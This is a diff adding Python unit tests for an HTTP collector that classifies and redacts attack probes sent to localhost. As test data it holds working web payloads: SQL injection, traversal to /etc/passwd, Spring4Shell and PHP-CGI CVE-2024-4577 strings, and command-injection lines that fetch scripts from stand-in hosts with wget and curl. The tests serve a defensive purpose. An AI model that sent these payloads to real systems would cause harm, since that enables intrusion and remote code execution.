@@ -544,6 +544,168 @@ class HttpCollectorSecurityTests(unittest.TestCase):
         self.assertEqual(rec["metadata"]["headers"]["user-agent"], "[REDACTED_JNDI]")
         self.assertEqual(rec["attack_category"], "suspected_cve_probe")
 
+    def test_detects_generic_attack_techniques_without_claiming_cves(self) -> None:
+        cases = [
+            (
+                "GET",
+                "/items?id=1%20UN/**/ION%20SELECT%201,2,3",
+                None,
+                "http-sqli-attempt",
+                "sql_injection",
+                "url",
+            ),
+            (
+                "GET",
+                "/static/../../etc/passwd",
+                None,
+                "http-path-traversal-attempt",
+                "path_traversal",
+                "url",
+            ),
+            (
+                "POST",
+                "/run",
+                b"cmd=test;id",
+                "http-cmd-injection-attempt",
+                "command_injection",
+                "body",
+            ),
+        ]
+        for method, path, body, expected_sig, expected_tech, expected_loc in cases:
+            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+            conn.request(method, path, body=body)
+            resp = conn.getresponse()
+            resp.read()
+            self.assertEqual(resp.status, 404)
+            conn.close()
+
+        records = self._read_records()
+        self.assertEqual(len(records), len(cases))
+        for rec, (_, _, _, expected_sig, expected_tech, expected_loc) in zip(records, cases):
+            self.assertEqual(rec["attack_category"], "web_attack_attempt")
+            dets = rec["metadata"]["signature_detections"]
+            matched = [d for d in dets if d["signature_id"] == expected_sig]
+            self.assertEqual(len(matched), 1)
+            det = matched[0]
+            self.assertEqual(det["classification"], "indicator_match")
+            self.assertEqual(det["attack_technique"], expected_tech)
+            self.assertEqual(det["candidate_cves"], [])
+            self.assertIsNone(det["candidate_cve"])
+            self.assertEqual(det["matched_location"], expected_loc)
+            self.assertIn("no specific CVE inferred", det["summary"])
+
+    def test_detects_additional_cve_specific_http_signatures(self) -> None:
+        cases = [
+            (
+                "GET",
+                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+                None,
+                "http-apache-path-traversal-cve-2021-41773",
+                ["CVE-2021-41773", "CVE-2021-42013"],
+                None,
+            ),
+            (
+                "POST",
+                "/app",
+                b"class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
+                "http-spring4shell-cve-2022-22965",
+                ["CVE-2022-22965"],
+                "CVE-2022-22965",
+            ),
+            (
+                "POST",
+                "/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+                b"<?php echo 1; ?>",
+                "http-php-cgi-arg-injection-cve-2024-4577",
+                ["CVE-2024-4577"],
+                "CVE-2024-4577",
+            ),
+        ]
+        # Increase max_body_bytes for Spring4Shell form parameter in body
+        self.server.config = dataclasses.replace(self.server.config, max_body_bytes=256)
+        for method, path, body, expected_sig, expected_cves, expected_single in cases:
+            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+            conn.request(method, path, body=body)
+            resp = conn.getresponse()
+            resp.read()
+            self.assertEqual(resp.status, 404)
+            conn.close()
+
+        records = self._read_records()
+        self.assertEqual(len(records), len(cases))
+        for rec, (_, _, _, expected_sig, expected_cves, expected_single) in zip(records, cases):
+            self.assertEqual(rec["attack_category"], "suspected_cve_probe")
+            dets = rec["metadata"]["signature_detections"]
+            matched = [d for d in dets if d["signature_id"] == expected_sig]
+            self.assertEqual(len(matched), 1)
+            det = matched[0]
+            self.assertEqual(det["classification"], "candidate_cve")
+            self.assertEqual(det["candidate_cves"], expected_cves)
+            self.assertEqual(det["candidate_cve"], expected_single)
+            self.assertTrue(len(det["references"]) >= 1)
+            self.assertIn("not confirmed exploitation", det["summary"])
+
+    def test_benign_requests_do_not_trigger_false_positives(self) -> None:
+        benign_paths = [
+            "/articles/how-to-select-a-database?id=42&name=O'Brien",
+            "/docs/../about.html",
+            "/search?q=union+station&sort=id&order=asc",
+            "/api/v1/users?id=100&status=active",
+        ]
+        for path in benign_paths:
+            conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+            conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0 (compatible; Test/1.0)"})
+            resp = conn.getresponse()
+            resp.read()
+            self.assertEqual(resp.status, 404)
+            conn.close()
+
+        for rec in self._read_records():
+            self.assertNotIn("signature_detections", rec["metadata"])
+            self.assertNotIn("attack_category", rec)
+
+    def test_redacts_command_injection_callback_urls_in_path_and_headers(self) -> None:
+        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=3)
+        conn.request(
+            "GET",
+            "/ping?host=127.0.0.1;wget%20http://cmd-evil.invalid/drop.sh",
+            headers={
+                "User-Agent": "$(curl http://ua-evil.invalid/p.sh)",
+            },
+        )
+        resp = conn.getresponse()
+        resp.read()
+        self.assertEqual(resp.status, 404)
+        conn.close()
+
+        raw_jsonl = self.output_path.read_text(encoding="utf-8")
+        self.assertNotIn("cmd-evil.invalid", raw_jsonl)
+        self.assertNotIn("ua-evil.invalid", raw_jsonl)
+        rec = self._read_records()[0]
+        self.assertEqual(rec["attack_category"], "web_attack_attempt")
+        self.assertTrue(
+            any(
+                d["signature_id"] == "http-cmd-injection-attempt"
+                for d in rec["metadata"]["signature_detections"]
+            )
+        )
+
+    def test_signature_inspection_stays_fast_on_adversarial_inputs(self) -> None:
+        adversarial = InspectionInput(
+            method="POST",
+            raw_path="/" + ("../" * 600),
+            headers=(
+                ("User-Agent", "${" * 1000),
+                ("X-Custom", "a" + ("/**/" * 400) + "b"),
+            ),
+            body_bytes=(";" + (" " * 4000)).encode("utf-8"),
+        )
+        start = time.monotonic()
+        for _ in range(50):
+            inspect_http_request(adversarial)
+        elapsed = time.monotonic() - start
+        self.assertLess(elapsed, 2.0)
+
 
 if __name__ == "__main__":
     unittest.main()
